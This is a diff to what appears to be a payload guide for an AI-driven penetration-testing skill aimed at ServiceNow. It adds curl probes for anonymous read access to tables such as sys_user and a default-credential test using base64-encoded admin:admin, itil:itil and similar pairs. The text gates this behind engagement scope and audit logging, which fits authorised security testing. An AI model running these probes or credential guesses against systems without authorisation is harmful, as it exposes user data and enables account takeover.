@@ -6,7 +6,17 @@ Use these payloads after `vendor-platform-enum/SKILL.md` triggers on a ServiceNo
 
 ## Standard table probe list
 
-Probe each table with `GET /api/now/v1/table/<table>?sysparm_limit=1`. A 200 with non-empty `result[]` is anonymous-readable; 401/403 with `User Not Authenticated` is the expected baseline.
+Probe each table via `aith assess kali exec` so each request lands in the audit pipeline. A 200 with non-empty `result[]` is anonymous-readable; 401/403 with `User Not Authenticated` is the expected baseline.
+
+```bash
+aith assess kali exec --technique INFO-DISCLOSURE \
+  --intent "ServiceNow table probe — sys_user anonymous-read test" \
+  --probe-kind payload --phase recon --timeout 30 -- \
+  curl -sS 'https://TARGET/api/now/v1/table/sys_user?sysparm_limit=1' \
+    -H 'Accept: application/json'
+```
+
+Table list to probe (send the same probe shape for each):
 
 ```
 sys_user, sys_user_group, sys_user_grmember, sys_user_role, sys_user_has_role,
@@ -84,16 +94,27 @@ GET /api/now/v1/table/sys_user/<modified-sys-id>
 
 ## Default credentials probe (operator-gated)
 
-Only when the engagement scope explicitly permits credentialed testing, probe ServiceNow default-admin credentials:
+Only when the engagement scope explicitly permits credentialed testing, probe ServiceNow default-admin credentials. Run via `aith assess kali exec` with `--destructive` because a successful auth test establishes a session:
+
+```bash
+aith assess kali exec --technique AUTH \
+  --intent "ServiceNow default-credential probe admin:admin" \
+  --probe-kind payload --phase consume-test --timeout 30 --destructive -- \
+  curl -sS 'https://TARGET/api/now/v1/table/sys_user?sysparm_limit=1' \
+    -H 'Accept: application/json' \
+    -H 'Authorization: Basic YWRtaW46YWRtaW4='
+```
+
+Default credential pairs to cycle through (`echo -n "user:pass" | base64` to encode each):
 
 ```
-admin:admin
-admin:Password1
-admin:ChangeMe
-itil:itil
+admin:admin       → YWRtaW46YWRtaW4=
+admin:Password1   → YWRtaW46UGFzc3dvcmQx
+admin:ChangeMe    → YWRtaW46Q2hhbmdlTWU=
+itil:itil         → aXRpbDppdGls
 ```
 
-Send `GET /api/now/v1/table/sys_user?sysparm_limit=1` with `Authorization: Basic <base64>`. A 200 with results is a separate finding from the anonymous-read finding (default-credentials, not no-auth).
+A 200 with results is a separate finding from the anonymous-read finding (default-credentials, not no-auth).
 
 ## Rate-limit discipline
 
